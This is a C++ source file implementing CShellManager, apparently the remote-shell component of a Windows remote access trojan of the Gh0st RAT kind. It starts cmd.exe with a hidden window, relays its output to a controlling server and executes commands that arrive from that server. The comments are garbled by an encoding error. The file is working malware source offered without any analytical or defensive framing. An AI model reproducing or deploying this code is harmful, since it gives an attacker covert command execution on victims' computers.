// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ShellManager.h"
#include "Common.h"
#include <IOSTREAM>
using namespace std;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

BOOL bStarting = TRUE;

CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
{
	m_nCmdLength = 0;
	bStarting = TRUE;
	m_hThreadRead = NULL;
	m_hShellProcessHandle   = NULL;    //����Cmd���̵Ľ��̾�������߳̾��
	m_hShellThreadHandle	= NULL;
	SECURITY_ATTRIBUTES  sa = {0};
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;     //��Ҫ
	m_hReadPipeHandle	= NULL;   //client
	m_hWritePipeHandle	= NULL;   //client
	m_hReadPipeShell	= NULL;   //cmd
	m_hWritePipeShell	= NULL;   //cmd
	//�����ܵ�
	if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)
		{
			CloseHandle(m_hReadPipeHandle);
		}
		if(m_hWritePipeShell != NULL)
		{
			CloseHandle(m_hWritePipeShell);
		}
		return;
	}

	if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
	{
		if(m_hWritePipeHandle != NULL)
		{
			CloseHandle(m_hWritePipeHandle);
		}
		if(m_hReadPipeShell != NULL)
		{
			CloseHandle(m_hReadPipeShell);
		}
		return;
	}

	//���Cmd FullPath
	char  strShellPath[MAX_PATH] = {0};
	GetSystemDirectory(strShellPath, MAX_PATH);  //C:\windows\system32
	//C:\windows\system32\cmd.exe
	strcat(strShellPath,"\\cmd.exe");

	//1 Cmd Input Output Ҫ�͹ܵ���Ӧ��
	//2 Cmd Hide

	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0};    //CreateProcess

	memset((void *)&si, 0, sizeof(si));
	memset((void *)&pi, 0, sizeof(pi));

	si.cb = sizeof(STARTUPINFO);  //��Ҫ

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput  = m_hReadPipeShell;                           //���ܵ���ֵ
	si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	si.wShowWindow = SW_HIDE;

	//����Cmd����
	//3 �̳�

	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
	}

	m_hShellProcessHandle   = pi.hProcess;    //����Cmd���̵Ľ��̾�������߳̾��
	m_hShellThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;      //����ͷ�ļ� Common.h     
	m_ClientObject->OnServerSending((char*)&bToken, 1);

	WaitForDialogOpen();

	m_hThreadRead = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
{
	unsigned long   dwReturn = 0;
	char	szBuffer[1024] = {0};
	DWORD	dwTotal = 0;
	CShellManager *This = (CShellManager*)lParam;
	while (bStarting)
	{
		Sleep(100);
		//�������Ƿ�������  ���ݵĴ�С�Ƕ���
		while (PeekNamedPipe(This->m_hReadPipeHandle,     //��������
			szBuffer, sizeof(szBuffer), &dwReturn, &dwTotal, NULL)) 
		{
			//���û�����ݾ�����������ѭ��
			if (dwReturn <= 0)
				break;
			memset(szBuffer, 0, sizeof(szBuffer));
			LPBYTE szTotalBuffer = (LPBYTE)LocalAlloc(LPTR, dwTotal);
			//��ȡ�ܵ�����
			ReadFile(This->m_hReadPipeHandle, 
				szTotalBuffer, dwTotal, &dwReturn, NULL);
#ifdef _DEBUG
			printf("===> Input length= %d \n", This->m_nCmdLength);
#endif
			const char *pStart = (char*)szTotalBuffer + This->m_nCmdLength;
			int length = int(dwReturn) - This->m_nCmdLength;
			if (length > 0)
				This->m_ClientObject->OnServerSending(pStart, length);

			LocalFree(szTotalBuffer);
		}
	}
	cout<<"ReadPipe�߳��˳�\n";
	return 0;
}

VOID CShellManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{			
			NotifyDialogIsOpen();
			break;
		}
	default:
		{
			m_nCmdLength = (ulLength - 2);// ����"\r\n"
			unsigned long	dwReturn = 0;
			WriteFile(m_hWritePipeHandle, szBuffer, ulLength, &dwReturn,NULL);
			break;
		}
	}
}

CShellManager::~CShellManager()
{
	bStarting = FALSE;

	TerminateProcess(m_hShellProcessHandle, 0);   //���������Լ�������Cmd����
	TerminateThread(m_hShellThreadHandle, 0);     //���������Լ�������Cmd�߳�
	Sleep(100);

	if (m_hReadPipeHandle != NULL)
	{
		DisconnectNamedPipe(m_hReadPipeHandle);
		CloseHandle(m_hReadPipeHandle);
		m_hReadPipeHandle = NULL;
	}
	if (m_hWritePipeHandle != NULL)
	{
		DisconnectNamedPipe(m_hWritePipeHandle);
		CloseHandle(m_hWritePipeHandle);
		m_hWritePipeHandle = NULL;
	}
	if (m_hReadPipeShell != NULL)
	{
		DisconnectNamedPipe(m_hReadPipeShell);
		CloseHandle(m_hReadPipeShell);
		m_hReadPipeShell = NULL;
	}
	if (m_hWritePipeShell != NULL)
	{
		DisconnectNamedPipe(m_hWritePipeShell);
		CloseHandle(m_hWritePipeShell);
		m_hWritePipeShell = NULL;  
	}
	if (m_hThreadRead)
	{
		CloseHandle(m_hThreadRead);
		m_hThreadRead = NULL;
	}
}
